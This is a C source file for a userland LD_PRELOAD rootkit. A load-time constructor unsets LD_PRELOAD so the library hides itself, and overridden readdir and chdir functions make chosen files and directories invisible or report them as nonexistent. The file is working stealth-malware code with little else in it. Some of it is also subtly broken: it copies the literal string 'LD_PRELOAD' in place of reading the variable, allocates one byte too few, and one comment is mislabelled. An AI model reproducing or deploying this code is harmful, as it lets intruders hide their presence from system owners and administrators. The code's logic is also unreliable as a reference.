#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dlfcn.h>

#define MAX_FDPATH_LEN 25
#include "censor.h"
#include "hooks.h"

extern void *__libc_dlopen_mode(const char*, int);
extern char **environ;

static void onload() __attribute__((constructor));
static void onunload() __attribute__((destructor));

// stores the value of the LD_PRELOAD variable, set at load time
char *STORED_LD_PRELOAD;

/*
 * move full path of file with filename *filename* in directory with fd *dirfd*
 * into buffer at *filepath* with length *len*.
 */
void
getfullpath(char *filepath, int dirfd, const char *filename, int len)
{
    char fdpath[MAX_FDPATH_LEN], dirpath[PATH_MAX];

    memset(dirpath, 0, sizeof(dirpath));

    snprintf(fdpath, MAX_FDPATH_LEN-1, "/proc/self/fd/%d", dirfd);
    readlink(fdpath, dirpath, PATH_MAX);

    snprintf(filepath, len, "%s/%s", dirpath, filename);
}

/* 
 * Load libdl.so.2 and store LD_PRELOAD environment variable when shared
 * object gets loaded. 
 */
static void onload() {
    char *env;
    int len, i;

    // load libdl.so.2 to have dlsym
    __libc_dlopen_mode("libdl.so.2", RTLD_NOW|RTLD_GLOBAL);

    for (i = 0; i < NUM_HOOKED_FUN; i++) lookup_sym(i);

    env = ("LD_PRELOAD");
    len = strlen(env);
    STORED_LD_PRELOAD = malloc(len);
    memset(STORED_LD_PRELOAD, 0, len);
    strncpy(STORED_LD_PRELOAD, env, len);

    // LD_PRELOAD is unset when module gets loaded to hide itself
    unsetenv("LD_PRELOAD");
}

/* Restore LD_PRELOAD when shared object gets loaded. */
static void onunload() {
    // LD_PRELOAD is set again when module gets unloaded
    setenv("LD_PRELOAD", STORED_LD_PRELOAD, 1);
    free(STORED_LD_PRELOAD);
}

/* Skip dirent structs for hidden files */
struct dirent *
readdir(DIR *dirp)
{
    struct dirent *entry;
    char filepath[PATH_MAX + 1];

    do {
        if ((entry = real_readdir(dirp)) == NULL) return entry;
        getfullpath(filepath, dirfd(dirp), entry->d_name, sizeof(filepath));
    } while (ishidden(filepath));

    return entry;
}

/* 
 * Return -1 and set errno to "ENOENT - No such file or directory" if the target
 * path is hidden. 
 */
int
chdir(const char *path)
{
    int dirfd;
    char fullpath[PATH_MAX + 1];
    const char *epath;

    if (!strncmp(path, "/", 1)) epath = path;
    else {
        dirfd = open(".", O_RDONLY);
        getfullpath(fullpath, dirfd, path, PATH_MAX);
        close(dirfd);
        epath = fullpath;
    }

    real_chdir = dlsym(RTLD_NEXT, "chdir");

    if (ishidden(epath)) {
        errno = ENOENT;
        return -1;
    }

    return real_chdir(path);
}
